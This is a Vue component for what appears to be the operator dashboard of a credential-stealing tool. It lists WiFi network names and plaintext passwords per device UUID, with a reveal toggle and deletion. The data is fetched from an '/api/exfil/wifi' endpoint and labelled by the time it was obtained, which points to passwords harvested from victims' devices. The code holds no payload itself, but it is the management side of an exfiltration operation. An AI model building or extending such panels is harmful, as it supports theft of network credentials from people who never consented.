<template>
  <div class="wifi">
    <el-card>
      <div class="search-bar">
        <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
        <el-input v-model="filters.ssid" placeholder="WiFi名称" style="width: 200px;" />
        <el-button type="primary" @click="loadWiFi">查询</el-button>
        <el-button @click="resetFilters">重置</el-button>
      </div>
      
      <el-table :data="wifiData" border v-loading="loading">
        <el-table-column prop="id" label="ID" width="80" />
        <el-table-column prop="device_uuid" label="设备UUID" width="250" />
        <el-table-column prop="ssid" label="WiFi名称" />
        <el-table-column prop="password" label="密码" show-overflow-tooltip>
          <template #default="scope">
            <span>{{ scope.row.password || '******' }}</span>
            <el-button size="small" @click="togglePassword(scope.row)" v-if="scope.row.password">显示</el-button>
          </template>
        </el-table-column>
        <el-table-column prop="security_type" label="加密类型" width="120">
          <template #default="scope">
            <el-tag :type="getSecurityType(scope.row.security_type)">{{ scope.row.security_type || '-' }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="created_at" label="获取时间" width="180" />
        <el-table-column label="操作" width="100">
          <template #default="scope">
            <el-button size="small" type="danger" @click="deleteItem(scope.row.id)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>
      
      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive } from 'vue'
import axios from '../utils/axios'

const wifiData = ref([])
const loading = ref(false)

const filters = reactive({
  device_uuid: '',
  ssid: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

function getSecurityType(type) {
  if (!type) return 'info'
  if (type.includes('WPA') || type.includes('WPA2') || type.includes('WPA3')) return 'success'
  if (type.includes('WEP')) return 'warning'
  return 'danger'
}

function togglePassword(row) {
  row.password = row.password === '******' ? row.original_password : '******'
}

async function loadWiFi() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.ssid) params.append('ssid', filters.ssid)
    
    const response = await axios.get(`/api/exfil/wifi?${params}`)
    wifiData.value = response.data.map(item => ({ ...item, password: item.password ? '******' : '', original_password: item.password }))
  } catch (error) {
    console.error('加载数据失败:', error)
  } finally {
    loading.value = false
  }
}

async function deleteItem(id) {
  if (!confirm('确定要删除这条记录吗？')) return
  try {
    await axios.delete(`/api/exfil/${id}`)
    loadWiFi()
  } catch (error) {
    console.error('删除失败:', error)
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.ssid = ''
  loadWiFi()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadWiFi()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadWiFi()
}

loadWiFi()
</script>

<style scoped>
.search-bar {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}
</style>
